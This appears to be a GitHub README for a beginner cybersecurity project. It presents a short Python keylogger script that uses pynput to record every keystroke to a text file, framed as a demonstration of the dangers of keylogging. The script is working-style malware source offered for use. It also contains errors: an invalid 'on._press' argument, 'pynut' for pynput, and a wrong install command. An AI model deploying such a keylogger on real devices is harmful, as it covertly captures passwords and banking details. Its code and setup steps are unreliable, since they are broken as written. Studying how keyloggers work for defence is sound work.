# Keylogger-Python &nbsp; <img src="https://github.com/user-attachments/assets/fa080d46-0f3c-4c19-a3fb-6324e1b6cdf5" width="36">

## Background and Significance 🔍
Keylogging is the method of storing key-strokes on a device, particularly without the user knowing. Having a program such as this running on your device will result in the unaware surrendering of confidential data to malicious hackers, including login credentials and banking details.

## Objective 🥅
This mini-project aims to create a successful key-logging script, that when executed, will capture keystrokes made by the user in any environment on the device and store them in a text file automatically for viewing. This project therefore demonstrates the basics of keylogging, highlighting the dangers of this simple technique.

## Skills Learned and Improved ✅
- Learning this attacking technique strengthened my ethical hacking fundamentals.
- Increased cybersecurity awareness surrounding even simple malicious methods.
- Honing my Python skills.

## Tools/Languages Used 🔨
- VSCode
- Python

## Script 📜
<code>
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error: Character could not be obtained.")

if __name__ == "__main__":
    listener = keyboard.Listener(on._press=keyPressed) 
    listener.start()
    input()
</code>

## How it Works ❓
1. Keystrokes are listened for using pynut library
2. When this script is executed, these keystrokes are then appended to a file (keyfile.txt) and also appear in the terminal. Example shown below:

<img width="649" alt="keylogger screenshot" src="https://github.com/user-attachments/assets/1944e555-febe-4dd1-940d-3681d8293419" />


   
## Tips & Resources ✍️📖
### Tips
- Install pynput library first! You can use either 'py -m install pynput' or 'pip install pynput' in the terminal

### Resources
- Keylogging Python Tutorial by <strong> Shaun Halverson </strong>: <href> https://www.youtube.com/watch?v=mDY3v2Xx-Q4 </href>
